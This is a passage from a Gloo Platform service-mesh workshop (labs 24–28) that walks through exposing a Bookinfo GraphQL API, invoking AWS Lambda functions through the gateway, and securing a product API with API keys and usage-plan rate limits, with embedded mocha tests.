              graphqlParent: {}
            resolverResultVar:
              resolverResult: {}
          resolvers:
          - restResolver:
              destinations:
              - port:
                  number: 9080
                ref:
                  name: ratings
                  namespace: bookinfo-backends
                  cluster: cluster1
              request:
                headers:
                  :path:
                    jq: '"/ratings/" + (.parentVar.id | tostring)'
            resolverResultTransform:
              jq: '.resolverResultVar.ratings | to_entries | map(.reviewer=.key | .numStars=.value | del(.key,.value))'
EOF
```

After that, you need to create an `ApiSchema` which references the `ApiDoc` and the `GraphQLResolverMap`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: apimanagement.gloo.solo.io/v2
kind: GraphQLSchema
metadata:
  name: bookinfo-graphql-schema
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  schemaRef:
    name: bookinfo-api-doc
    namespace: bookinfo-frontends
    clusterName: cluster1
  resolved:
    options: {}
    resolverMapRefs:
    - name: bookinfo-graphql-resolvers
      namespace: bookinfo-frontends
      clusterName: cluster1
EOF
```

Finally, you can create a `RouteTable` to expose the GraphQL API:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: graphql
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
  - graphql:
      schema:
        name: bookinfo-graphql-schema
        namespace: bookinfo-frontends
        clusterName: cluster1
    matchers:
    - uri:
        prefix: /graphql
    labels:
      graphql: "true"
EOF
```

Now, you can try to 

```bash
curl -k "https://cluster1-bookinfo.example.com/graphql" --data '{"query":"{productsForHome { title ratings {reviewer numStars}}}"}' | jq .
```

Here is the expected output:

```
{
  "data": {
    "productsForHome": [
      {
        "title": "The Comedy of Errors",
        "ratings": [
          {
            "reviewer": "Reviewer1",
            "numStars": 5
          },
          {
            "reviewer": "Reviewer2",
            "numStars": 4
          }
        ]
      }
    ]
  }
}
```

<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("GraphQL", function() {
  it('GraphQL query returning the expected output', function () {
    
    let command = `curl -ks "https://cluster1-bookinfo.example.com/graphql" --data '{"query":" {productsForHome { title ratings {reviewer numStars}}}"}'`
    let cli = chaiExec(command);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('{"data":{"productsForHome":[{"title":"The Comedy of Errors","ratings":[{"reviewer":"Reviewer1","numStars":5},{"reviewer":"Reviewer2","numStars":4}]}]}}');
  })
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/gateway-graphql/tests/graphql.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Create the following `CORSPolicy` to allow using the GraphQL explorer from the Gloo Mesh UI:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: CORSPolicy
metadata:
  name: graphql-explorer
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        graphql: "true"
  config:
    allowCredentials: true
    allowHeaders:
    - apollo-query-plan-experimental
    - content-type
    - x-apollo-tracing
    allowMethods:
    - POST
    allowOrigins:
    - regex: ".*"
EOF
```



## Lab 25 - Deploy the Amazon pod identity webhook <a name="lab-25---deploy-the-amazon-pod-identity-webhook-"></a>

To use the AWS Lambda integration, we need to deploy the Amazon EKS pod identity webhook.

A pre requisite is to install [Cert Manager](https://cert-manager.io/):

```bash
wget https://github.com/cert-manager/cert-manager/releases/download/v1.12.4/cert-manager.yaml
kubectl --context ${CLUSTER1} apply -f cert-manager.yaml
kubectl --context ${MGMT} apply -f cert-manager.yaml
kubectl --context ${MGMT} -n cert-manager rollout status deploy cert-manager
kubectl --context ${MGMT} -n cert-manager rollout status deploy cert-manager-cainjector
kubectl --context ${MGMT} -n cert-manager rollout status deploy cert-manager-webhook
kubectl --context ${CLUSTER1} -n cert-manager rollout status deploy cert-manager
kubectl --context ${CLUSTER1} -n cert-manager rollout status deploy cert-manager-cainjector
kubectl --context ${CLUSTER1} -n cert-manager rollout status deploy cert-manager-webhook
```

Now, you can install the Amazon EKS pod identity webhook:

```bash
kubectl --context ${CLUSTER1} apply -f data/steps/deploy-amazon-pod-identity-webhook
kubectl --context ${MGMT} apply -f data/steps/deploy-amazon-pod-identity-webhook
kubectl --context ${MGMT} rollout status deploy/pod-identity-webhook
kubectl --context ${CLUSTER1} rollout status deploy/pod-identity-webhook
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Amazon EKS pod identity webhook", () => {
  it('Amazon EKS pod identity webhook is ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "default", k8sObj: "pod-identity-webhook" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/deploy-amazon-pod-identity-webhook/tests/pods-available.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 26 - Execute Lambda functions <a name="lab-26---execute-lambda-functions-"></a>
[<img src="https://img.youtube.com/vi/gD6GLMlP-Qc/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/gD6GLMlP-Qc "Video Link")

First of all, you need to annotate the service account used by the Istio ingress gateway to allow it to assume an AWS role which can invoke the `echo` Lambda function:

```bash
kubectl --context ${CLUSTER1} -n istio-gateways annotate sa -l istio=ingressgateway "eks.amazonaws.com/role-arn=arn:aws:iam::253915036081:role/lambda-workshop"
kubectl --context ${CLUSTER1} -n istio-gateways rollout restart deploy $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}')
```

Then, you can create a `CloudProvider` object corresponding to the AWS role:

```bash
kubectl apply --context ${MGMT} -f - <<EOF

apiVersion: infrastructure.gloo.solo.io/v2
kind: CloudProvider
metadata:
  name: aws
  namespace: gloo-mesh
spec:
  aws:
    stsEndpoint: sts.amazonaws.com
    accountId: "253915036081"
    region: eu-west-1
    lambda:
      invokeRoleName: lambda-workshop
      discovery:
        enabled: true
        roleName: lambda-workshop
EOF
```
Now you need to annotate the service account used by the mgmt server, so it can discover existing lambdas:

```bash
kubectl --context ${MGMT} -n gloo-mesh annotate sa -l app=gloo-mesh-mgmt-server "eks.amazonaws.com/role-arn=arn:aws:iam::253915036081:role/lambda-workshop"
kubectl --context ${MGMT} -n gloo-mesh rollout restart deploy gloo-mesh-mgmt-server
```

After a few seconds, `CloudResources` objects will be created with the discovered Lambda functions.

Finally, you can create a `RouteTable` to expose the `echo` Lambda function through the gateway:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: aws
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
  - name: lambda
    matchers:
    - uri:
        prefix: /lambda
    labels:
      route: lambda
    forwardTo:
      destinations:
      - awsLambda:
          cloudProvider:
            name: aws
            namespace: gloo-mesh
            cluster: mgmt
          function: workshop-echo
          options:
            responseTransformation: RESPONSE_DISABLE
EOF
```

The `echo` lambda function is a simple Node.js function returning the even it receives:

```,nocopy
exports.handler = async (event) => {
    return event;
};
```

You should now be able to invoke the Lambda function using the following command:

```bash
curl -k "https://cluster1-httpbin.example.com/lambda" | jq .
```

You should get a response like below:

```js,nocopy
{
  "headers": {
    ":authority": "172.19.2.1",
    ":method": "GET",
    ":path": "/lambda",
    ":scheme": "https",
    "accept": "*/*",
    "user-agent": "curl/7.81.0",
    "x-envoy-decorator-operation": "dummy-route-o4bo-WppHSxD6Ox2.badHost.solo.io:8443/lambda*",
    "x-envoy-internal": "true",
    "x-envoy-peer-metadata": "ChQKDkFQUF9DT05UQUlORVJTEgIaAAoYCgpDTFVTVEVSX0lEEgoaCGNsdXN0ZXIxCh0KDElOU1RBTkNFX0lQUxINGgsxMC4xMDIuMC4zMAoeCg1JU1RJT19WRVJTSU9OEg0aCzEuMTUuNC1zb2xvCrkDCgZMQUJFTFMSrgMqqwMKHQoDYXBwEhYaFGlzdGlvLWluZ3Jlc3NnYXRld2F5CjYKKWluc3RhbGwub3BlcmF0b3IuaXN0aW8uaW8vb3duaW5nLXJlc291cmNlEgkaB3Vua25vd24KGQoFaXN0aW8SEBoOaW5ncmVzc2dhdGV3YXkKFgoMaXN0aW8uaW8vcmV2EgYaBDEtMTUKMAobb3BlcmF0b3IuaXN0aW8uaW8vY29tcG9uZW50EhEaD0luZ3Jlc3NHYXRld2F5cwohChFwb2QtdGVtcGxhdGUtaGFzaBIMGgo1ZjU1NjVmNjU0ChIKCHJldmlzaW9uEgYaBDEtMTUKOQofc2VydmljZS5pc3Rpby5pby9jYW5vbmljYWwtbmFtZRIWGhRpc3Rpby1pbmdyZXNzZ2F0ZXdheQovCiNzZXJ2aWNlLmlzdGlvLmlvL2Nhbm9uaWNhbC1yZXZpc2lvbhIIGgZsYXRlc3QKIQoXc2lkZWNhci5pc3Rpby5pby9pbmplY3QSBhoEdHJ1ZQonChl0b3BvbG9neS5pc3Rpby5pby9uZXR3b3JrEgoaCGNsdXN0ZXIxChIKB01FU0hfSUQSBxoFbWVzaDEKNAoETkFNRRIsGippc3Rpby1pbmdyZXNzZ2F0ZXdheS0xLTE1LTVmNTU2NWY2NTQtbXBkdzUKHQoJTkFNRVNQQUNFEhAaDmlzdGlvLWdhdGV3YXlzCmQKBU9XTkVSElsaWWt1YmVybmV0ZXM6Ly9hcGlzL2FwcHMvdjEvbmFtZXNwYWNlcy9pc3Rpby1nYXRld2F5cy9kZXBsb3ltZW50cy9pc3Rpby1pbmdyZXNzZ2F0ZXdheS0xLTE1ChcKEVBMQVRGT1JNX01FVEFEQVRBEgIqAAosCg1XT1JLTE9BRF9OQU1FEhsaGWlzdGlvLWluZ3Jlc3NnYXRld2F5LTEtMTU=",
    "x-envoy-peer-metadata-id": "router~10.102.0.30~istio-ingressgateway-1-15-5f5565f654-mpdw5.istio-gateways~istio-gateways.svc.cluster.local",
    "x-forwarded-for": "10.102.0.1",
    "x-forwarded-proto": "https",
    "x-request-id": "79cccfc1-beab-4249-b6ad-d71a410aff5f"
  },
  "httpMethod": "GET",
  "path": "/lambda",
  "queryString": ""
}
```

It's very similar to what the `httpbin` application provides. It displays information about the request is has received.
<!--bash
# It takes a few seconds for the Lambda function to be updated
ATTEMPTS=1
until [[ $(kubectl --context $CLUSTER1 -n istio-gateways get envoyfilters.networking.istio.io -n istio-gateways -oyaml|grep workshop-echo) ]] || [ $ATTEMPTS -gt 120 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
done
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Lambda integration is working properly", () => {
  it('Checking text \'"path":"/lambda"\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/lambda', body: '"path":"/lambda"', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-lambda/tests/check-lambda-echo.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
But when a Lambda function is exposed through an AWS API Gateway, the response of the function should be in a specific format (see this [example](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-create-api-as-simple-proxy-for-lambda.html)).

The Gloo Gateway integration has the ability to understand this format and to process the response in the same way an AWS API gateway would.

Here is the Node.js Lambda function we're going to use to demonstrate this capability:

```js,nocopy
export const handler = async(event) => {
    const response = {
        "statusCode": 201,
        "headers": {
            "key": "value"
        },
        "isBase64Encoded": false,
        "multiValueHeaders": { 
            "X-Custom-Header": ["My value", "My other value"],
        },
        "body": JSON.stringify({TotalCodeSize: 104330022,FunctionCount: 26})
    }
    return response;
};
```
Let's update the `RouteTable`:
```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: aws
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
  - name: lambda
    matchers:
    - uri:
        prefix: /lambda
    labels:
      route: lambda
    forwardTo:
      destinations:
      - awsLambda:
          cloudProvider:
            name: aws
            namespace: gloo-mesh
            cluster: mgmt
          function: workshop-api-gateway
          options:
            responseTransformation: RESPONSE_DEFAULT
EOF
```

The `RESPONSE_DEFAULT` instructs Gloo Gateway to parse the response differently.

You should now be able to invoke the Lambda function using the following command:

```sh
curl -k "https://cluster1-httpbin.example.com/lambda"
```

You should get a response like below:

```js,nocopy
{
  "TotalCodeSize": 104330022,
  "FunctionCount": 26
}
```

Now, let's have a look at the response headers:

```sh
curl -k "https://cluster1-httpbin.example.com/lambda" -I
```

You should get a response like below:

```js,nocopy
HTTP/2 201 
content-type: application/json
key: value
x-custom-header: My value,My other value
content-length: 55
date: Fri, 13 Jan 2023 10:37:54 GMT
server: istio-envoy
```

You can see the `key` and `x-custom-header` added by the Lambda function.
<!--bash
# It takes a few seconds for the Lambda function to be updated
ATTEMPTS=1
until [[ $(kubectl --context $CLUSTER1 -n istio-gateways get envoyfilters.networking.istio.io -n istio-gateways -oyaml|grep workshop-api-gateway) ]] || [ $ATTEMPTS -gt 120 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 1
done
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Lambda integration is working properly", () => {
  it('Checking text \'"TotalCodeSize": 104330022\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/lambda', body: '"TotalCodeSize": 104330022', match: true }));
  it('Checking headers in ' + process.env.CLUSTER1, () => helpersHttp.checkHeaders({ host: `https://cluster1-httpbin.example.com`, path: '/lambda', expectedHeaders: [{key: "key", value: "value"}, {key: "x-custom-header", value: "My value,My other value"}], match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-lambda/tests/check-lambda-api-gateway.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Let's remove the annotation and restart the pods:

```bash
kubectl --context ${CLUSTER1} -n istio-gateways annotate sa -l istio=ingressgateway "eks.amazonaws.com/role-arn-"
kubectl --context ${CLUSTER1} -n istio-gateways rollout restart deploy $(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=ingressgateway -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${MGMT} -n gloo-mesh annotate sa -l app=gloo-mesh-mgmt-server "eks.amazonaws.com/role-arn-"
kubectl --context ${MGMT} -n gloo-mesh rollout restart deploy gloo-mesh-mgmt-server
```

And also delete the different objects we've created:

```bash
kubectl --context ${MGMT} -n gloo-mesh delete cloudprovider aws
```






## Lab 27 - Expose the productpage API securely <a name="lab-27---expose-the-productpage-api-securely-"></a>
[<img src="https://img.youtube.com/vi/pkzeYaTj9k0/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/pkzeYaTj9k0 "Video Link")


Gloo Platform includes a developer portal, which is well integrated with its core API.

Let's start with API discovery.

Annotate the `productpage` service to allow the Gloo Platform agent to discover its API:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends annotate service productpage gloo.solo.io/scrape-openapi-source=https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/swagger.yaml --overwrite
kubectl --context ${CLUSTER1} -n bookinfo-frontends annotate service productpage gloo.solo.io/scrape-openapi-pull-attempts="3" --overwrite
kubectl --context ${CLUSTER1} -n bookinfo-frontends annotate service productpage gloo.solo.io/scrape-openapi-retry-delay=5s --overwrite
kubectl --context ${CLUSTER1} -n bookinfo-frontends annotate service productpage gloo.solo.io/scrape-openapi-use-backoff="true" --overwrite
```

<!--bash
until kubectl --context ${CLUSTER1} -n bookinfo-frontends get apidoc productpage-service; do
  kubectl --context ${CLUSTER1} -n bookinfo-frontends rollout restart deploy productpage-v1
  kubectl --context ${CLUSTER1} -n bookinfo-frontends rollout status deploy productpage-v1
  sleep 1
done
-->

An `APIDoc` Kubernetes object should be automatically created:

```shell
kubectl --context ${CLUSTER1} -n bookinfo-frontends get apidoc productpage-service -o yaml
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("APIDoc has been created", () => {
    it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo-frontends", k8sType: "apidoc", k8sObj: "productpage-service" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You should get something like this:

```yaml,nocopy
apiVersion: apimanagement.gloo.solo.io/v2
kind: ApiDoc
metadata:
  creationTimestamp: "2023-04-05T06:48:33Z"
  generation: 1
  labels:
    reconciler.mesh.gloo.solo.io/name: schema-reporter-service
  name: productpage-service
  namespace: bookinfo-frontends
  resourceVersion: "116408"
  uid: 2ae9188c-713e-4ba3-86a6-8689f55cda0f
spec:
  openapi:
    inlineString: '{"components":{"schemas":{"Product":{"description":"Basic information
      about a product","properties":{"descriptionHtml":{"description":"Description
      of the book - may contain HTML tags","type":"string"},"id":{"description":"Product
      id","format":"int32","type":"integer"},"title":{"description":"Title of the
      book","type":"string"}},"required":["id","title","descriptionHtml"],"type":"object"},"ProductDetails":{"description":"Detailed
      information about a product","properties":{"ISBN-10":{"description":"ISBN-10
      of the book","type":"string"},"ISBN-13":{"description":"ISBN-13 of the book","type":"string"},"author":{"description":"Author
      of the book","type":"string"},"id":{"description":"Product id","format":"int32","type":"integer"},"language":{"description":"Language
      of the book","type":"string"},"pages":{"description":"Number of pages of the
      book","format":"int32","type":"integer"},"publisher":{"description":"Publisher
      of the book","type":"string"},"type":{"description":"Type of the book","enum":["paperback","hardcover"],"type":"string"},"year":{"description":"Year
      the book was first published in","format":"int32","type":"integer"}},"required":["id","publisher","language","author","ISBN-10","ISBN-13","year","type","pages"],"type":"object"},"ProductRatings":{"description":"Object
      containing ratings of a product","properties":{"id":{"description":"Product
      id","format":"int32","type":"integer"},"ratings":{"additionalProperties":{"type":"string"},"description":"A
      hashmap where keys are reviewer names, values are number of stars","type":"object"}},"required":["id","ratings"],"type":"object"},"ProductReviews":{"description":"Object
      containing reviews for a product","properties":{"id":{"description":"Product
      id","format":"int32","type":"integer"},"reviews":{"description":"List of reviews","items":{"$ref":"#/components/schemas/Review"},"type":"array"}},"required":["id","reviews"],"type":"object"},"Rating":{"description":"Rating
      of a product","properties":{"color":{"description":"Color in which stars should
      be displayed","enum":["red","black"],"type":"string"},"stars":{"description":"Number
      of stars","format":"int32","maximum":5,"minimum":1,"type":"integer"}},"required":["stars","color"],"type":"object"},"Review":{"description":"Review
      of a product","properties":{"rating":{"$ref":"#/components/schemas/Rating"},"reviewer":{"description":"Name
      of the reviewer","type":"string"},"text":{"description":"Review text","type":"string"}},"required":["reviewer","text"],"type":"object"}}},"externalDocs":{"description":"Learn
      more about the Istio BookInfo application","url":"https://istio.io/docs/samples/bookinfo.html"},"info":{"description":"This
      is the API of the Istio BookInfo sample application.","license":{"name":"Apache
      2.0","url":"http://www.apache.org/licenses/LICENSE-2.0.html"},"termsOfService":"https://istio.io/","title":"BookInfo
      API","version":"1.0.0"},"openapi":"3.0.3","paths":{"/products":{"get":{"description":"List
      all products available in the application with a minimum amount of information.","operationId":"getProducts","responses":{"200":{"content":{"application/json":{"schema":{"items":{"$ref":"#/components/schemas/Product"},"type":"array"}}},"description":"successful
      operation"}},"summary":"List all products","tags":["product"]}},"/products/{id}":{"get":{"description":"Get
      detailed information about an individual product with the given id.","operationId":"getProduct","parameters":[{"description":"Product
      id","in":"path","name":"id","required":true,"schema":{"format":"int32","type":"integer"}}],"responses":{"200":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ProductDetails"}}},"description":"successful
      operation"},"400":{"description":"Invalid product id"}},"summary":"Get individual
      product","tags":["product"]}},"/products/{id}/ratings":{"get":{"description":"Get
      ratings for a product, including stars and their color.","operationId":"getProductRatings","parameters":[{"description":"Product
      id","in":"path","name":"id","required":true,"schema":{"format":"int32","type":"integer"}}],"responses":{"200":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ProductRatings"}}},"description":"successful
      operation"},"400":{"description":"Invalid product id"}},"summary":"Get ratings
      for a product","tags":["rating"]}},"/products/{id}/reviews":{"get":{"description":"Get
      reviews for a product, including review text and possibly ratings information.","operationId":"getProductReviews","parameters":[{"description":"Product
      id","in":"path","name":"id","required":true,"schema":{"format":"int32","type":"integer"}}],"responses":{"200":{"content":{"application/json":{"schema":{"$ref":"#/components/schemas/ProductReviews"}}},"description":"successful
      operation"},"400":{"description":"Invalid product id"}},"summary":"Get reviews
      for a product","tags":["review"]}}},"servers":[{"url":"/api/v1"}],"tags":[{"description":"Information
      about a product (in this case a book)","name":"product"},{"description":"Review
      information for a product","name":"review"},{"description":"Rating information
      for a product","name":"rating"}]}'
  servedBy:
  - destinationSelector:
      port:
        number: 9080
      selector:
        cluster: cluster1
        name: productpage
        namespace: bookinfo-frontends
```

Note that you can create the `APIDoc` manually to allow you:
- to provide the OpenAPI document as code
- to declare an API running outside of Kubernetes (`ExternalService`)
- to target a service running on a different cluster (`VirtualDestination`)
- ...

We can now expose the API through Ingress Gateway using a `RouteTable`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage-api-v1
  namespace: bookinfo-frontends
  labels:
    expose: "true"
    portal-users: "true"
    api: bookinfo
spec:
  portalMetadata:
    title: BookInfo REST API v1
    description: REST API for the Bookinfo application
    apiProductId: bookinfo
    apiProductDisplayName: BookInfo REST API
    apiVersion: v1
    customMetadata:
      lifecyclePhase: "General Availability"
  http:
    - matchers:
      - uri:
          prefix: /api/bookinfo/v1
      labels:
        apikeys: "true"
        ratelimited: "true"
        api: "productpage"
      forwardTo:
        pathRewrite: /api/v1/products
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
            port:
              number: 9080
EOF
```

You can see some labels set at the `RouteTable` and at the `route` level. We're going to take advantage of them later.

The `portalMetadata` section will be used when we'll expose the API through the developer portal.

You can think about this `RouteTable` as an API product. Also, note that we defined the version to be `v1`.

You should now be able to access the API through the gateway without any authentication:

```shell
curl -k "https://cluster1-bookinfo.example.com/api/bookinfo/v1"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the API without authentication", () => {
  it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Here is the expected output:

```json,nocopy
[{"id": 0, "title": "The Comedy of Errors", "descriptionHtml": "<a href=\"https://en.wikipedia.org/wiki/The_Comedy_of_Errors\">Wikipedia Summary</a>: The Comedy of Errors is one of <b>William Shakespeare's</b> early plays. It is his shortest and one of his most farcical comedies, with a major part of the humour coming from slapstick and mistaken identity, in addition to puns and word play."}]
```

You generally want to secure the access. Let's use API keys for that.

You need to create an `ExtAuthPolicy`: 

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: bookinfo-apiauth
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        apikeys: "true"
  config:
    server:
      name: ext-auth-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    glooAuth:
      configs:
        - apiKeyAuth:
            headerName: api-key
            headersFromMetadataEntry:
              X-Solo-Plan:
                name: usagePlan
                required: true
            k8sSecretApikeyStorage:
              labelSelector:
                auth: api-key
EOF
```

This policy will be attached to our `RouteTable` due to the label `apikeys: "true"` we set in its `route`.

Try to access the API without authentication:

```shell
curl -k "https://cluster1-bookinfo.example.com/api/bookinfo/v1" -I
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 401', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 401 }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

The access is refused (401 response):

```http
HTTP/2 401 
www-authenticate: API key is missing or invalid
date: Wed, 05 Apr 2023 08:13:11 GMT
server: istio-envoy
```

Let's create an API key for a user `user1`:

```bash
export API_KEY_USER1=apikey1
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: user1
  namespace: bookinfo-frontends
  labels:
    auth: api-key
type: extauth.solo.io/apikey
stringData:
  api-key: apikey1
  user-id: user1
  user-email: user1@solo.io
  usagePlan: gold
EOF
```

Now, you should be able to access the API using this API key:

```shell
curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v1"
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY_USER1}], retCode: 200 }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

We'll see later that the API keys can be created on demand by the end user through the developer portal (and stored on Redis for better scalability).

So, we've secured the access to our API, but you generally want to limit the usage of your API.

We're going to create 3 usage plans (bronze, silver and gold).

The user `user1` is a gold user (`gold` base64 is `Z29sZA==`).

The `X-Solo-Plan` is created by the `ExtAuthPolicy` we have created earlier.

Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors we will use later:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerConfig
metadata:
  name: productpage
  namespace: gloo-mesh-addons
spec:
  destinationServers:
  - ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: userId
          - key: usagePlan
            value: bronze
        rateLimit:
          requestsPerUnit: 1
          unit: MINUTE
      - simpleDescriptors:
          - key: userId
          - key: usagePlan
            value: silver
        rateLimit:
          requestsPerUnit: 3
          unit: MINUTE
      - simpleDescriptors:
          - key: userId
          - key: usagePlan
            value: gold
        rateLimit:
          requestsPerUnit: 5
          unit: MINUTE
EOF
```

It defines the limits for each plan.

After that, we need to create a `RateLimitPolicy` object to define the descriptors:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitPolicy
metadata:
  name: productpage
  namespace: bookinfo-frontends
spec:
  applyToRoutes:
  - route:
      labels:
        ratelimited: "true"
  config:
    serverSettings:
      name: rate-limit-server
      namespace: gloo-mesh-addons
      cluster: cluster1
    raw:
      rateLimits:
      - setActions:
        - requestHeaders:
            descriptorKey: usagePlan
            headerName: X-Solo-Plan
        - metadata:
            descriptorKey: userId
            metadataKey:
              key: envoy.filters.http.ext_authz
              path:
                - key: userId
    ratelimitServerConfig:
      name: productpage
      namespace: gloo-mesh-addons
      cluster: cluster1
    phase:
      postAuthz:
        priority: 1

EOF
```

This policy will be attached to our `RouteTable` due to the label `ratelimited: "true"` we set in its `route`.

Try to access the API more than 5 times:

```shell
for i in `seq 1 10`; do curl -k -H "api-key: ${API_KEY_USER1}" "https://cluster1-bookinfo.example.com/api/bookinfo/v1" -I; done
```

You should be rate limited:

```http
HTTP/2 200 
content-type: application/json
content-length: 395
server: istio-envoy
date: Wed, 05 Apr 2023 08:44:42 GMT
x-envoy-upstream-service-time: 1

...

HTTP/2 429 
x-envoy-ratelimited: true
date: Wed, 05 Apr 2023 08:44:42 GMT
server: istio-envoy
```




## Lab 28 - Expose an external API and stitch it with another one <a name="lab-28---expose-an-external-api-and-stitch-it-with-another-one-"></a>
